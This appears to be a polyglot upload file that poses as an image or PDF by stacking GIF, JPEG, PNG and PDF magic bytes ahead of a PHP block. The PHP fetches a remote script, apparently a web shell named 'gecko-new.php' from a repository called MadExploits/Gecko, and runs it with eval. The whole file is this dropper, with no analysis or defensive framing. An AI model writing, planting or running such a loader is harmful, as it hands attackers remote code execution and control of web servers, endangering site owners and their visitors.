GIF89a
\xFF\xD8\xFF
\x89PNG\r\n\x1a\n
%PDF-1.4
<?php
    $url = 'https://raw.githubusercontent.com/MadExploits/Gecko/refs/heads/main/gecko-new.php';

    $code = file_get_contents($url);

    eval('?>' . $code);
?>
